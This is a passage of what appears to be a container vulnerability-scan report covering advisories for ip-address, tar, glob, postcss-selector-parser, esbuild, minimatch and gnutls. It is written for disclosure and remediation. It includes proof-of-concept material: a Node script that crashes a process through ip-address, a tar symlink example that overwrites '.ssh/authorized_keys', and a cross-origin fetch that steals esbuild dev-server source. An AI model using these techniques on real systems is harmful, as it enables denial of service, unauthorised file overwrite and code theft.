    `Bad character${badCharacters.length > 1 ? 's' : ''} detected in address: ${badCharacters.join('')}`,
    address.replace(constants6.RE_BAD_CHARACTERS, '<span class="parse-error">$1</span>'),
  );
}
```

`RE_BAD_CHARACTERS` is `/([^0-9a-f:/%])/gi`. For an input made entirely of punctuation the `match` allocates one string per character, the `join` copies them all into the message, and the `replace` produces a string 34 times the input. Nothing before this point looks at the length: the constructor strips a CIDR suffix and a zone identifier and hands the rest to `parse()`. The `RE_BAD_ADDRESS` branch below it builds its diagnostic the same way at about a third of the ratio, for input in the hex-and-colon alphabet such as `fffff:` repeated.

`parse()` is reached only through the constructor, so every entry point that constructs an `Address6` from a string it has not already bounded is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, `fromWildcard()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromURL()` admits only hex, colons, and dots in a host, so it reaches the `RE_BAD_ADDRESS` branch and not the other. `fromArpa()` caps its input at 32 nibbles before constructing anything, and `fromBigInt()`, `fromByteArray()`, and `fromAddress4()` build the string themselves, so those are unaffected.

The `replace` is where size becomes fatal. V8 caps a string at 2^29 - 24 characters, so past 16 MiB of input the `replace` throws `RangeError: Invalid string length` rather than the `AddressError` callers catch; `isValid()` swallows it, but a constructor call guarded by `instanceof AddressError` does not. Past 32 MiB the replacement builder's internal array exceeds its maximum size and V8 aborts the process with `Fatal JavaScript invalid size error`, which no `try`/`catch` intercepts.

### Affected versions

`<= 10.7.0`. The diagnostic has had this shape since the parser was written, so every release is affected.

### Impact

`Address6.isValid()` on N bytes of `!`, measured on node 24.19.0:

| Input | Wall time | Transient heap | Outcome |
|---|---|---|---|
| 16 KiB | 1 ms | 1 MB | `false` |
| 1 MiB | 73 ms | 112 MB | `false` |
| 8 MiB | 464 ms | 784 MB | `false` |
| 16 MiB | | | `RangeError: Invalid string length` from the constructor; `isValid()` returns `false` |
| 32 MiB | | | the process aborts |

The parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. The heap is transient and is reclaimed after the call returns, so memory does not accumulate across requests; the abort at 32 MiB is a single request. `Address4` has no diagnostic of this shape and parses the same 8 MiB in a few milliseconds.

### Reachability

Reaching the sizes above requires that the application hand the parser a string it has not already bounded. A host taken from a URL or an HTTP header is bounded by the server's header limit (Node's default is 16 KB), and at that size the cost is a millisecond. The megabyte sizes need a request body the application accepts at that scale and passes through unchecked. Common body parsers default to between 100 KB and 1 MB, which caps the effect at a stall of under 100 ms per request, and the abort needs 32 MiB in a single field, which no default admits. The severity is scored for the stall, not the abort: an application that accepts 32 MiB bodies into an address parser is the exception, and the reader running one should treat this as a crash.

### Proof of concept

`npm i ip-address@<!-- -->10.7.0`, then:

```js
const { Address6 } = require('ip-address');

for (const mib of [1, 8]) {
  const input = '!'.repeat(mib * 1024 * 1024);
  const before = process.memoryUsage().heapUsed;
  const start = process.hrtime.bigint();

  Address6.isValid(input);

  const ms = Number(process.hrtime.bigint() - start) / 1e6;
  const mb = (process.memoryUsage().heapUsed - before) / 1048576;

  console.log(`${mib} MiB: ${ms.toFixed(0)} ms, ${mb.toFixed(0)} MB`);
}

try {
  new Address6('!'.repeat(16 * 1024 * 1024));
} catch (e) {
  console.log(`16 MiB: ${e.name}: ${e.message}`);
}

new Address6('!'.repeat(32 * 1024 * 1024));
```

On affected versions (node 24.19.0):

```
1 MiB: 73 ms, 112 MB
8 MiB: 464 ms, 784 MB
16 MiB: RangeError: Invalid string length


#
# Fatal error in , line 0
# Fatal JavaScript invalid size error 142606336
#
```

The last line is V8 terminating the process; the script does not reach its end.

### Remediation

Upgrade to the patched release. In the fix, the constructor rejects an address longer than the family allows before `parse()` runs: 45 characters for IPv6 once the CIDR suffix and zone identifier are stripped (six four-digit groups, six colons, and a dotted quad, the same line CPython's `ipaddress` module draws), and 15 characters for IPv4. The rejection is an `AddressError` with no `parseMessage`, so `isValid()` returns `false` for the cost of a length comparison and the 32 MiB input above is rejected in the same time as a 46-character one. A zone identifier is not counted, since it never reaches the diagnostic.

This rejects nothing a previous release accepted: every string longer than the limit already failed to parse.

If you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:

```js
if (host.length > 64) throw new Error('not an IP address');
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.34+dfsg-1.2+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/tar@1.34%2Bdfsg-1.2%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-45582?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D1.34%2Bdfsg-1.2%2Bdeb12u1"><img alt="medium : CVE--2025--45582" src="https://img.shields.io/badge/CVE--2025--45582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.34+dfsg-1.2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.490%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.35 allows file overwrite via directory traversal in crafted TAR archives, with a certain two-step process. First, the victim must extract an archive that contains a ../ symlink to a critical directory. Second, the victim must extract an archive that contains a critical file, specified via a relative pathname that begins with the symlink name and ends with that critical file's name. Here, the extraction follows the symlink and overwrites the critical file. This bypasses the protection mechanism of "Member name contains '..'" that would occur for a single TAR archive that attempted to specify the critical file via a ../ approach. For example, the first archive can contain "x -> ../../../../../home/victim/.ssh" and the second archive can contain x/authorized_keys. This can affect server applications that automatically extract any number of user-supplied TAR archives, and were relying on the blocking of traversal. This can also affect software installation processes in which "tar xf" is run more than once (e.g., when installing a package can automatically install two dependencies that are set up as untrusted tarballs instead of official packages).

---
Disputed tar issue, works as documented per upstream:
https://lists.gnu.org/archive/html/bug-tar/2025-08/msg00012.html
https://github.com/i900008/vulndb/blob/main/Gnu_tar_vuln.md

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-2541?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2005--2541" src="https://img.shields.io/badge/CVE--2005--2541-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.992%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.

---
This is intended behaviour, after all tar is an archiving tool and you
need to give -p as a command line flag
- tar <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=328228; unimportant)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>13.0.6</code> (npm)</summary>

<small><code>pkg:npm/glob@13.0.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-118773?s=github&n=glob&t=npm&vr=%3E%3D9.0.0%2C%3C%3D14.0.1"><img alt="medium 6.3: CVE--2026--118773" src="https://img.shields.io/badge/CVE--2026--118773-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><=14.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>14.0.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.350%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

In glob 13.0.6, an aborted async walk rejects or emits an error but continues recursively reading directories in the background.

The root cause is that abort branches in src/walker.ts call cb() without returning. As a result, callers that rely on signal or AbortSignal.timeout() to bound glob traversal cost can still incur filesystem I/O and CPU work after the request has already been rejected.

### Details

This was reproduced on glob v13.0.6 (commit e80cb38ae60d6cbff9e75f39032a994858994d35).

The README documents that the signal option cancels the glob walk. However, in src/walker.ts, the following methods call cb() when this.signal?.aborted is true but do not return:

- GlobUtil.walkCB()
- GlobUtil.walkCB2()
- GlobUtil.walkCBSync()
- GlobUtil.walkCB2Sync()

Example vulnerable pattern:

if (this.signal?.aborted) cb()

Because execution continues after cb(), the walker still reaches processor.processPatterns(), readdirCB(), and recursive walkCB2() calls.

The issue was directly demonstrated against v13.0.6. A source-history review shows the same missing-return pattern is present in tagged releases from v9.0.0 through v13.0.6.

The issue affects both glob() and globStream().

Recommended fix:
Change each abort branch to return immediately:

if (this.signal?.aborted) return cb()

### Proof of concept

Environment:
- Linux x86_64
- Node.js v22.23.3
- npm 10.9.9
- glob 13.0.6

Reproduction steps:

1. Install the affected package:
   npm init -y
   npm install glob@<!-- -->13.0.6

2. Run the attached PoC:
   node poc/abort-continues-work.mjs

The PoC aborts after the first readdir() call, waits briefly, and counts how many more directory reads happen after the promise has already rejected.

Observed output on the vulnerable version:

{
  "rejection": "Error: probe-abort",
  "readdirCalls": 1365,
  "readdirCallsAtReject": 5,
  "readdirCallsAfterReject": 1360
}

Expected behavior:
readdirCallsAfterReject should be 0.

A second PoC using AbortSignal.timeout() also reproduces the issue:

{
  "rejection": "TimeoutError: The operation was aborted due to timeout",
  "readdirCalls": 133,
  "readdirCallsAtReject": 1,
  "readdirCallsAfterReject": 132
}

The same test against a patched build with return cb() in the four abort branches stops immediately:

{
  "readdirCalls": 1,
  "readdirCallsAtReject": 1,
  "readdirCallsAfterReject": 0
}

### Impact

This is an availability issue.

Applications that expose globbing over attacker-influenced patterns or attacker-controlled directory trees and use AbortSignal / AbortSignal.timeout() as a traversal budget can still perform significant filesystem I/O and CPU work after a request has already timed out or been canceled.

Repeated timed-out requests can stack background glob walks and degrade worker throughput or service availability.

No confidentiality or integrity impact was observed.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>postcss-selector-parser</strong> <code>7.1.4</code> (npm)</summary>

<small><code>pkg:npm/postcss-selector-parser@7.1.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-104844?s=github&n=postcss-selector-parser&t=npm&vr=%3E%3D7.0.0%2C%3C7.1.6"><img alt="medium 5.9: CVE--2026--104844" src="https://img.shields.io/badge/CVE--2026--104844-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><7.1.6</code></td></tr>
<tr><td>Fixed version</td><td><code>7.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.389%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as
`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id
indexes. Three passes scanned those index arrays linearly for every index,
making the parse O(n^2) in the number of indexes rather than in input length:
`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.
Parsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a
single thread. A benign selector of identical byte size parses in tens of
milliseconds, so the cost is driven by the index count, not the input size.
The nesting depth of such a selector is 0, so the `maxNestingDepth` guard added
in 7.1.3 offers no protection.

Reachability is deployment dependent. Only consumers that parse untrusted,
attacker-supplied selectors synchronously in a request path are exposed, for
example CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary
build-time use on trusted sources is not affected.

### Patches

Fixed in 7.1.6. The three passes now use Set membership tests, making parsing
linear in the number of indexes. There is no behaviour change: parsing is
byte-identical on a differential corpus of 8413 selectors.

### Workarounds

Cap the size of selectors accepted from untrusted sources before parsing.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>esbuild</strong> <code>0.18.20</code> (npm)</summary>

<small><code>pkg:npm/esbuild@0.18.20</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-67mh-4wv8-2f99?s=github&n=esbuild&t=npm&vr=%3C%3D0.24.2"><img alt="medium 5.3: GHSA--67mh--4wv8--2f99" src="https://img.shields.io/badge/GHSA--67mh--4wv8--2f99-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Origin Validation Error</i>

<table>
<tr><td>Affected range</td><td><code><=0.24.2</code></td></tr>
<tr><td>Fixed version</td><td><code>0.25.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.

### Details

esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.

https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121
https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363

**Attack scenario**:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
1. The user accesses the malicious web page.
1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.

In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by

- Fetching `/index.html`: normally you have a script tag here
- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files
- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)
- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file

The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.

### PoC

1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)
2. Extract it and move to that directory
1. Run `npm i`
1. Run `npm run watch`
1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.

![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)

### Impact

Users using the serve feature may get the source code stolen by malicious websites.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>minimatch</strong> <code>10.2.5</code> (npm)</summary>

<small><code>pkg:npm/minimatch@10.2.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-118764?s=github&n=minimatch&t=npm&vr=%3E%3D7.0.0%2C%3C11.0.1"><img alt="medium 6.9: CVE--2026--118764" src="https://img.shields.io/badge/CVE--2026--118764-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Asymmetric Resource Consumption (Amplification)</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><11.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>11.0.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.301%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id)
files: 

- src/index.ts: 690-770
- src/index.ts: 780-796

issue:
input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

the **/../ transformation clones a globparts entry and appends the clone to the same globparts array:
```
parts.splice(gs, 1)
const other = parts.slice(0)
other[gs] = '**'
globParts.push(other)
```
this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:
```
for (let i = 0; i < globParts.length - 1; i++) {
  for (let j = i + 1; j < globParts.length; j++) {
    this.partsMatch(...)
  }
}
```
an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>gnutls28</strong> <code>3.7.9-2+deb12u7</code> (deb)</summary>

<small><code>pkg:deb/debian/gnutls28@3.7.9-2%2Bdeb12u7?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-95210?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--95210" src="https://img.shields.io/badge/CVE--2026--95210-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.200%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 does not reject a critical keyUsage extension when it cannot be processed, such as when extnValue is an ASN.1 NULL (05 00) instead of a BIT STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-95210
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-95209?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--95209" src="https://img.shields.io/badge/CVE--2026--95209-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.241%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue in gnutls v3.8.13 causes legitimate CA certificates to be rejected, leading to a Denial of Service (DoS). NOTE: this is disputed by multiple parties because the behavior does not offer a new ability for an adversary to conduct a denial of service, and because the product can reasonably choose to enforce a dNSName constraint against Common Name when Subject Alternative Name is absent.

---
REJECTED

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-95184?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--95184" src="https://img.shields.io/badge/CVE--2026--95184-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.208%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 does not properly enforce name constraints, as demonstrated by a permitted subtree violation for "EE O=Evil accepted although outside permitted O=Good." NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-95184
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-88648?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--88648" src="https://img.shields.io/badge/CVE--2026--88648-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.202%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuTLS v3.8.13, an excluded msUPN/SRV otherName is never checked. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-88648
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-88647?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--88647" src="https://img.shields.io/badge/CVE--2026--88647-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.240%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 can perhaps unexpectedly trust a certificate on the basis of Common Name when Subject Alternative Name has an SRV otherName (1.3.6.1.5.5.7.8.7) whose value is an OCTET STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-88647
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-67693?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--67693" src="https://img.shields.io/badge/CVE--2026--67693-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.167%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuTLS v3.8.13 does not reject end-entity X.509 certificates that contain a contradictory combination of Key Usage (KU) and Extended Key Usage (EKU). NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

---
- gnutls28 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1150522; unimportant)
https://github.com/lkloliver/poc/tree/main/CVE-2026-67693
Not considered security issues by GNU TLS upstream within the GNU TLS security policy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-3389?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--3389" src="https://img.shields.io/badge/CVE--2011--3389-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>73.327%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

---
- sun-java6 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=645881)
[lenny] - sun-java6 <no-dsa> (Non-free not supported)
[squeeze] - sun-java6 <no-dsa> (Non-free not supported)
- openjdk-6 6b23~pre11-1
- openjdk-7 7~b147-2.0-1
- iceweasel <not-affected> (Vulnerable code not present)
http://blog.mozilla.com/security/2011/09/27/attack-against-tls-protected-communications/
- chromium-browser 15.0.874.106~r107270-1
[squeeze] - chromium-browser <end-of-life>
- lighttpd 1.4.30-1
strictly speaking this is no lighttpd issue, but lighttpd adds a workaround
- curl 7.24.0-1
http://curl.haxx.se/docs/adv_20120124B.html
- python2.6 2.6.8-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=684511)
[squeeze] - python2.6 <no-dsa> (Minor issue)
- python2.7 2.7.3~rc1-1
- python3.1 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=678998)
[squeeze] - python3.1 <no-dsa> (Minor issue)
- python3.2 3.2.3~rc1-1
http://bugs.python.org/issue13885
python3.1 is fixed starting 3.1.5
- cyassl <removed>
- gnutls26 <removed> (unimportant)
- gnutls28 <unfixed> (unimportant)
No mitigation for gnutls, it is recommended to use TLS 1.1 or 1.2 which is supported since 2.0.0
- haskell-tls <unfixed> (unimportant)
No mitigation for haskell-tls, it is recommended to use TLS 1.1, which is supported since 0.2
- matrixssl <removed> (low)
[squeeze] - matrixssl <no-dsa> (Minor issue)
[wheezy] - matrixssl <no-dsa> (Minor issue)
matrixssl fix this upstream in 3.2.2
- bouncycastle 1.49+dfsg-1
[squeeze] - bouncycastle <no-dsa> (Minor issue)
[wheezy] - bouncycastle <no-dsa> (Minor issue)
No mitigation for bouncycastle, it is recommended to use TLS 1.1, which is supported since 1.4.9
- nss 3.13.1.with.ckbi.1.88-1
https://bugzilla.mozilla.org/show_bug.cgi?id=665814
https://hg.mozilla.org/projects/nss/rev/7f7446fcc7ab
- polarssl <unfixed> (unimportant)
No mitigation for polarssl, it is recommended to use TLS 1.1, which is supported in all releases
- tlslite <removed>
[wheezy] - tlslite <no-dsa> (Minor issue)
- pound 2.6-2
Pound 2.6-2 added an anti_beast.patch to mitigate BEAST attacks.
- erlang 1:15.b-dfsg-1
[squeeze] - erlang <no-dsa> (Minor issue)
- asterisk 1:13.7.2~dfsg-1
[jessie] - asterisk 1:11.13.1~dfsg-2+deb8u1
[wheezy] - asterisk <no-dsa> (Minor issue)
[squeeze] - asterisk <end-of-life> (Not supported in Squeeze LTS)
http://downloads.digium.com/pub/security/AST-2016-001.html
https://issues.asterisk.org/jira/browse/ASTERISK-24972
patch for 11 (jessie): https://code.asterisk.org/code/changelog/asterisk?cs=f233bcd81d85626ce5bdd27b05bc95d131faf3e4
all versions vulnerable, backport required for wheezy

</blockquote>
